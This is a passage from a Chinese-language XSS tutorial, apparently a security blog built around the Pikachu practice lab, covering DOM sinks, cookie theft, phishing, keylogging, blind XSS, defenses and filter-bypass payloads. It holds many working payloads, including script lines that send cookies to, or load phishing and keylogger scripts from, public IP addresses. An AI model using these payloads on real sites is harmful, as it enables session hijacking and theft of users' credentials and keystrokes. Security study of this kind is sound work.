class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Tail<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里利用indexof获取url里的传参，然后用document.write()输出到HTML中,完成xss。</p><p>这种方式是非常隐蔽的，因为我们的传参没有和后端交互。这里使用?发送的数据包中可以看到咱们的传参。</p><p>但是我们这里使用锚点#，后端是不会识别锚点的，锚点只是给浏览器用的。</p><p>例如：<code>file:///D:/*/test.html#code=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p>这种数据包里都没有咱们的传参值的，非常的隐蔽！还有是document.write()它可以接受native编码，有时可以利用这个特性来绕waf！</p><h6 id="5-2-innerHTML"><a href="#5-2-innerHTML" class="headerlink" title="5.2) innerHTML"></a>5.2) innerHTML</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;666&#x27;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">fun()</span> <span class="attr">value</span>=<span class="string">&quot;点击有惊喜&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> url=<span class="built_in">unescape</span>(<span class="variable language_">document</span>.<span class="property">URL</span>);<span class="comment">//unescape函数是JavaScript中的一个全局函数，用于将被转义的字符串还原成原始字符串。它是escape函数的逆操作。</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pos=url.<span class="title function_">indexOf</span>(<span class="string">&quot;name=&quot;</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;666&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;Hi,&lt;b&gt;&quot;</span>+url.<span class="title function_">substring</span>(pos,url.<span class="property">length</span>)+<span class="string">&#x27;&lt;/b&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>innerHTML是改变标签中的值，像上面的代码是innerHTML将div标签中的hello改成Hi+name的值。</p><p>例如：<code>http://192.168.*/1.html#name=&lt;img srv=&#39;#&#39; onerror=alert(1) /&gt;</code></p><p>使用谷歌浏览器传入没有发生弹窗，但是使用事件型的XSS语句可以触发弹窗，这是因为像谷歌（不仅限于谷歌)浏览器会对典型的、太明显的XSS语句进行拦截。</p><h6 id="5-3-eval"><a href="#5-3-eval" class="headerlink" title="5.3) eval()"></a>5.3) eval()</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a =location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>);<span class="comment">//location.hash是取锚点</span></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">eval</span>(a);   <span class="comment">// eval是高危函数。 把字符串当做代码进行执行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如：<code>http://192.168.*/1.html#alert(1)</code></p><p>让location.hash获取网页锚点后的值放入eval中当作代码执行。</p><h2 id="2-XSS漏洞挖掘方法"><a href="#2-XSS漏洞挖掘方法" class="headerlink" title="2 XSS漏洞挖掘方法"></a>2 XSS漏洞挖掘方法</h2><h3 id="2-1-XSS可能存在的地方"><a href="#2-1-XSS可能存在的地方" class="headerlink" title="2.1 XSS可能存在的地方"></a>2.1 XSS可能存在的地方</h3><p>只要是用户输入输出、交互的地方，都可能存在XSS漏洞。</p><blockquote><p>HTML content</p><p>Attribute content</p><p>URL content </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;a标签&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>Style content</p><p>Script content</p><p>登录、注册、评论、留言等</p></blockquote><h3 id="2-2-XSS测试方法"><a href="#2-2-XSS测试方法" class="headerlink" title="2.2 XSS测试方法"></a>2.2 XSS测试方法</h3><ol><li>工具扫描：APPscan、AWVS、xray等大型漏扫工具、xsstrike等自动化小工具。</li></ol><blockquote><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p></blockquote><ol start="2"><li>手工测试：Burpsuite、Firefox（hackbar）</li></ol><h2 id="3-XSS攻击框架"><a href="#3-XSS攻击框架" class="headerlink" title="3 XSS攻击框架"></a>3 XSS攻击框架</h2><h3 id="3-1-基础知识"><a href="#3-1-基础知识" class="headerlink" title="3.1 基础知识"></a>3.1 基础知识</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">在<span class="title class_">Console</span>可输入以下代码</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>;<span class="comment">/*获取当前网页地址，document可省略。=&#x27;url&#x27;可跳转*/</span></span><br><span class="line">location.<span class="property">href</span> = <span class="string">&#x27;url&#x27;</span>;<span class="comment">//跳转到url页面 eg：location.href=&quot;https://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;url&#x27;</span>;<span class="comment">//跳转到url页面</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>;<span class="comment">//获取当前网页的所有cookie</span></span><br><span class="line"></span><br><span class="line">alert               <span class="title function_">alert</span>()方法用于显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>    <span class="variable language_">window</span>.<span class="property">location</span>对象用于获得当前页面的地址(<span class="variable constant_">URL</span>) ,并把浏览器重定向到新的页面 </span><br><span class="line">onload                  一张页面或一幅图像完成加载 </span><br><span class="line">onsubmit              确认按钮被点击 </span><br><span class="line">onerror                 在加载文档或图像时发生错误</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>  url编码 %3Cscript%3Ealert%<span class="number">281</span>%<span class="number">29</span>%3C%2Fscript%3E</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;  弹框内容为/</span><span class="variable constant_">XSS</span>/</span><br><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script&gt;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(document.cookie)&lt;/script&gt;//弹框cookie信息</span></span><br><span class="line"><span class="string">&lt;svg onload=alert(document.domain)&gt;//弹框域名</span></span><br><span class="line"><span class="string">&lt;img src=1 onerror=alert(/hi/)&gt;</span></span><br><span class="line"><span class="string">&lt;M onmouseover=alert(document.domain)&gt;M</span></span><br><span class="line"><span class="string">&lt;marquee onscroll=alert(document.domain)&gt;//失效</span></span><br><span class="line"><span class="string">&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;body onload=alert(document.domain)&gt;</span></span><br><span class="line"><span class="string">&lt;details open ontoggle=alert(document.domain)&gt;//点击详细信息</span></span><br><span class="line"><span class="string">&lt;embed src=javascript:alert(document.domain)&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-2-XSS平台搭建及后台使用（cookie获取）"><a href="#3-2-XSS平台搭建及后台使用（cookie获取）" class="headerlink" title="3.2 XSS平台搭建及后台使用（cookie获取）"></a>3.2 XSS平台搭建及后台使用（cookie获取）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script&gt;document.location = &#x27;</span><span class="attr">http</span>:<span class="comment">//127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://121.199.162.86:8889/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">//通过document.location实例进行重定向到http://192.168.1.1/pikachu/pkxss/xcookie/cookie.php?cookie=</span></span><br></pre></td></tr></table></figure><p>打开pikachu-&gt;管理工具-&gt;XSS后台，登录后点击“cookie搜集”。</p><h3 id="3-3-反射型XSS（POST）获取cookie"><a href="#3-3-反射型XSS（POST）获取cookie" class="headerlink" title="3.3 反射型XSS（POST）获取cookie"></a>3.3 反射型XSS（POST）获取cookie</h3><h4 id="3-3-1-获取cookie"><a href="#3-3-1-获取cookie" class="headerlink" title="3.3.1 获取cookie"></a>3.3.1 获取cookie</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span>攻击利用页面：~\phpstudy_pro\<span class="variable constant_">WWW</span>\pikachu\pkxss\xcookie\post.<span class="property">html</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Window</span>.<span class="property">onload</span>;<span class="comment">//当浏览器加载完页面所有内容后自动触发执行</span></span><br></pre></td></tr></table></figure><p>将post.html中的ip地址和xss路径进行修改，引导别人打开这个HTML文件，打开后就自动发送cookie信息到xss后台。</p><h4 id="3-3-2-使用cookie登录"><a href="#3-3-2-使用cookie登录" class="headerlink" title="3.3.2 使用cookie登录"></a>3.3.2 使用cookie登录</h4><p>打开正常登录后的网址<a href="http://pikachu/vul/xss/xsspost/xss_reflected_post.php%EF%BC%8C%E4%BD%BF%E7%94%A8Burpsuite%E6%8B%A6%E6%88%AA%EF%BC%8C%E5%B0%86cookie%E6%94%B9%E4%B8%BAxss%E5%90%8E%E5%8F%B0%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84cookie%EF%BC%8C%E6%94%BE%E8%A1%8C%E5%90%8E%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E3%80%82">http://pikachu/vul/xss/xsspost/xss_reflected_post.php，使用Burpsuite拦截，将cookie改为xss后台收集到的cookie，放行后即可登录成功。</a></p><h3 id="3-4-XSS钓鱼演示"><a href="#3-4-XSS钓鱼演示" class="headerlink" title="3.4 XSS钓鱼演示"></a>3.4 XSS钓鱼演示</h3><p>方法有很多，但主要看页面搭建的好不好，是不是和正常网站页面一样，能不能骗到别人。只要有XSS漏洞的地方，都可以钓鱼。</p><p>以pikachu的存储型xss为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">钓鱼攻击利用页面：~\phpstudy_pro\phpstudy_pro\WWW\pikachu\pkxss\xfish\fish.php</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;http://pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://121.199.162.86:8889/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://118.89.145.124/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开fish.php，修改ip地址为xss后台。</p><p>fish.php代码内容为弹出一个登录对话框，将用户在对话框中输入的用户名和密码发送到攻击者的xfish.php文件中，保存到攻击者数据库中。</p><blockquote><p>钓鱼页面在输入账号密码后经常会提示登录超时等，需要重新登录，网站也会发生变化。</p></blockquote><blockquote><p>phpstudy钓鱼演示，认证失败。</p><p><strong>PHP的HTTP认证机制仅在PHP以Apache模块方式运行时才有效，因此该功能不适用于CGI版本。</strong></p><p><strong>解决方案：重新部署环境</strong></p><p><a href="https://mp.weixin.qq.com/s/NR6tAA8vKexBZ6KXLQXxhA">https://mp.weixin.qq.com/s/NR6tAA8vKexBZ6KXLQXxhA</a></p></blockquote><h3 id="3-5-XSS获取键盘记录演示"><a href="#3-5-XSS获取键盘记录演示" class="headerlink" title="3.5 XSS获取键盘记录演示"></a>3.5 XSS获取键盘记录演示</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;&gt;&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;http://121.199.162.86:8889/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;http://118.89.145.124/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入到存储型XSS页面中。</p><p>在该页面敲击键盘，XSS后台页面能够看到键盘记录。</p><h3 id="3-6-XSS盲打"><a href="#3-6-XSS盲打" class="headerlink" title="3.6 XSS盲打"></a>3.6 XSS盲打</h3><p>盲打只是一种惯称的说法，就是不知道后台不知道有没有xss存在的情况下，不顾一切的输入xss代码在留言、feedback之类的地方，尽可能多的尝试xss的语句与语句的存在方式，就叫盲打。</p><p>“xss盲打”是指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的xss攻击代码（通常是使用script标签引入远程的js）的数据。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发xss来实现攻击者预定好的“真实攻击功能”。</p><p>通俗讲就是见到输入框就输入提前准备的xss代码， 通常是使用script标签引入远程的js代码，当有后台人员审核提交数据时候，点击了提交的数据，触发获取到有价值信息 。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hi<span class="string">&#x27;&quot;&gt;&lt;sCrIpT&gt;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&lt;/sCrIpT&gt;</span></span><br><span class="line"><span class="string">hi&#x27;</span><span class="string">&quot;&gt;&lt;sCrIpT&gt;alert(666)&lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure><p>管理员登录时查看相关页面，触发JS代码。</p><h2 id="4-XSS防御手段"><a href="#4-XSS防御手段" class="headerlink" title="4 XSS防御手段"></a>4 XSS防御手段</h2><p>对输入进行过滤，特殊符号必须过滤掉，单引号、双引号、尖括号等，对输出进行编码。</p><h3 id="4-1-htmlspecialchars"><a href="#4-1-htmlspecialchars" class="headerlink" title="4.1 htmlspecialchars"></a>4.1 htmlspecialchars</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string $string, int $quote_style = ENT_COMPAT, string $encoding = &#x27;UTF-8&#x27;, bool $double_encode = true)</span><br></pre></td></tr></table></figure><ul><li><code>$string</code>：需要转换的字符串。</li><li><code>$quote_style</code>：指定引号的风格。通常有三个可选值：<code>ENT_COMPAT</code>、<code>ENT_QUOTES</code> 和 <code>ENT_NOQUOTES</code>。<code>ENT_COMPAT</code> 会输出成 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&amp;</code>，<code>ENT_QUOTES</code> 会在 <code>ENT_COMPAT</code> 的基础上将单引号也转换为实体字符（<code>&#39;</code>），<code>ENT_NOQUOTES</code> 则不会输出引号。</li><li><code>$encoding</code>：设置字符编码，默认是 <code>UTF-8</code>。</li><li><code>$double_encode</code>：布尔值，指示是否对已经存在的实体进行再次编码。<br>使用 <code>htmlspecialchars</code> 函数可以避免跨站脚本攻击（XSS），因为它可以确保用户输入的字符串被正确地处理，不会因为浏览器解释特殊字符而执行不必要的脚本。</li></ul><h3 id="4-2-输入检查"><a href="#4-2-输入检查" class="headerlink" title="4.2 输入检查"></a>4.2 输入检查</h3><p>以下为需要过滤的常见字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|  &amp;  ;  $  %  @  &#x27;  &quot;  \&#x27;  \&quot;  &lt;&gt;  ()  +  CR  LF  ,  \</span><br></pre></td></tr></table></figure><h2 id="5-XSS跨站常见绕过方式"><a href="#5-XSS跨站常见绕过方式" class="headerlink" title="5 XSS跨站常见绕过方式"></a>5 XSS跨站常见绕过方式</h2><blockquote><p>XSS攻击绕过过滤方法大全：<a href="https://blog.csdn.net/qq_50854790/article/details/124297046">https://blog.csdn.net/qq_50854790/article/details/124297046</a></p></blockquote><h3 id="5-1-前端"><a href="#5-1-前端" class="headerlink" title="5.1 前端"></a>5.1 前端</h3><p>对前端的限制可以尝试进行抓包重发或者修改前端的HTML。比如输入框限制20个字符，但是前端的限制对能力强的攻击者来讲是无用的。可以抓包改请求包，或者直接在前端代码中修改等。</p><h3 id="5-2-后端"><a href="#5-2-后端" class="headerlink" title="5.2 后端"></a>5.2 后端</h3><h4 id="5-2-1-大小写混合"><a href="#5-2-1-大小写混合" class="headerlink" title="5.2.1 大小写混合"></a>5.2.1 大小写混合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipT&gt;ALert(&#x27;XSS&#x27;)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;script&gt;ALert(1)&lt;/script&gt;</span><br><span class="line">&lt;sCrIpT&gt;ALert(1)&lt;/sCrIpT&gt;</span><br><span class="line">&lt;ScRiPt&gt;ALert(1)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;sCrIpT&gt;ALert(1)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;ScRiPt&gt;ALert(1)&lt;/sCrIpT&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;iMg src=1 oNeRrOr=alert(1)&gt;</span><br><span class="line">&lt;ImG src=1 OnErRoR=alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;alert(&amp;quot;M&amp;quot;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;marquee onscroll=alert(1)&gt;//失效</span><br><span class="line">&lt;mArQuEe OnScRoLl=alert(1)&gt;</span><br><span class="line">&lt;MaRqUeE oNsCrOlL=alert(1)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-2-2-双写"><a href="#5-2-2-双写" class="headerlink" title="5.2.2 双写"></a>5.2.2 双写</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(123);&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="5-2-3-其它标签绕过"><a href="#5-2-3-其它标签绕过" class="headerlink" title="5.2.3 其它标签绕过"></a>5.2.3 其它标签绕过</h4><h5 id="1-img"><a href="#1-img" class="headerlink" title="1) img"></a>1) img</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">##</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hello</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">123</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hello</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">hello</span>&#x27;)&gt;</span>//字母“o”是希腊字母，无效</span><br><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;hello&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-a"><a href="#2-a" class="headerlink" title="2) a"></a>2) a</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=alert(document.cookie)&gt;请点击&lt;/a&gt;</span><br><span class="line">&quot; &gt;&lt;a href=javascript:alert(123)&gt;请点击&lt;/a&gt;</span><br></pre></td></tr></table></figure><h5 id="3-input"><a href="#3-input" class="headerlink" title="3) input"></a>3) input</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onfocus=javascript:alert(123)</span><br></pre></td></tr></table></figure><h5 id="4-iframe"><a href="#4-iframe" class="headerlink" title="4) iframe"></a>4) iframe</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&lt;iframe src=javascript:alert(&#x27;M&#x27;)&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe srcdoc=&lt;svg/o&amp;#x6E;load&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=https://baidu.com width=1366 height=768&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe</span><br></pre></td></tr></table></figure><h5 id="5-form"><a href="#5-form" class="headerlink" title="5) form"></a>5) form</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;M</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=M&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=M&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=1&gt;</span><br></pre></td></tr></table></figure><h4 id="5-2-4-空格绕过"><a href="#5-2-4-空格绕过" class="headerlink" title="5.2.4 空格绕过"></a>5.2.4 空格绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;java script:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-5-回车绕过-换行"><a href="#5-2-5-回车绕过-换行" class="headerlink" title="5.2.5 回车绕过 (换行)"></a>5.2.5 回车绕过 (换行)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;java</span></span></span><br><span class="line"><span class="string"><span class="tag">script:</span></span></span><br><span class="line"><span class="string"><span class="tag">alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-6-Tab绕过"><a href="#5-2-6-Tab绕过" class="headerlink" title="5.2.6 Tab绕过"></a>5.2.6 Tab绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-7-注释绕过"><a href="#5-2-7-注释绕过" class="headerlink" title="5.2.7 注释绕过"></a>5.2.7 注释绕过</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>()&lt;/script&gt;</span><br><span class="line">替换：</span><br><span class="line">&lt;scri&lt;!--<span class="number">1</span>--&gt;pt&gt;<span class="title function_">alert</span>()&lt;/sc&lt;!--<span class="number">1</span>--&gt;ript&gt;</span><br></pre></td></tr></table></figure><h4 id="5-2-8-字符拼接"><a href="#5-2-8-字符拼接" class="headerlink" title="5.2.8 字符拼接"></a>5.2.8 字符拼接</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用eval：eval是Javascript内置函数，用于计算字符串表达式的值。</span><br><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line">利用top</span><br><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-9-编码绕过"><a href="#5-2-9-编码绕过" class="headerlink" 